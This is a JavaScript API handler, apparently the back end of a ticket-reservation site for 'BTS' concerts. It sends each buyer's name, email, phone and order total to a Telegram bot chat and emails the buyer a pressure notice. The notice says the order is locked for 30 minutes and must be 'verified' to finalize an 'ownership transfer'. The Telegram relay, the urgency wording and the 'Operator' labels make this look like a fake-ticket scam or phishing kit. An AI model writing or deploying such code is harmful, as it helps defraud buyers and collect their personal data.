import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY);

export default async function handler(req, res) {
  // 1. Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { fullName, email, phone, quantity, city, orderId, total } = req.body;

  try {
    // 2. TRIGGER TELEGRAM (The Signal)
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    const telegramMessage = `🚨 **New Reservation**\nID: ${orderId}\nCity: ${city}\nName: ${fullName}\nQty: ${quantity}\nTotal: $${total}\nContact: ${email} / ${phone}`;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: telegramMessage,
        parse_mode: 'Markdown',
      }),
    });

    // 3. TRIGGER RESEND (The Email)
    await resend.emails.send({
      from: 'Brigit Access Desk <reservations@brigit.work>',
      to: email,
      subject: `Status Update: Reference ID ${orderId}`, 
      text: `System Notification: Your reservation for BTS ${city} has been initialized. Reference ID: ${orderId}. Please complete verification at Brigit.work within 30 minutes.`,
      html: `
        <div style="font-family: sans-serif; color: #333; max-width: 600px; border: 1px solid #eee; padding: 20px; border-radius: 8px;">
          <h2 style="font-size: 18px;">Inventory Notification: Reference ID ${orderId}</h2>
          <p>Your request for <strong>BTS ${city}</strong> has been logged in our verified inventory system.</p>
          <div style="background: #f4f4f4; padding: 15px; border-radius: 4px;">
            <p><strong>Status:</strong> Active (Locked for 30m)</p>
            <p><strong>Reference:</strong> ${orderId}</p>
          </div>
          <p>To finalize the ownership transfer to your account, please follow the verification steps provided at the <strong>Brigit.work Access Desk</strong>.</p>
          <hr />
          <p style="font-size: 10px; color: #999;">Automated message from Brigit.work | Privacy Policy: https://brigit.work</p>
        </div>
      `,
    });

    return res.status(200).json({ success: true, orderId });
  } catch (error) {
    console.error("Operator System Error:", error);
    return res.status(500).json({ error: 'System internal error', details: error.message });
  }
}
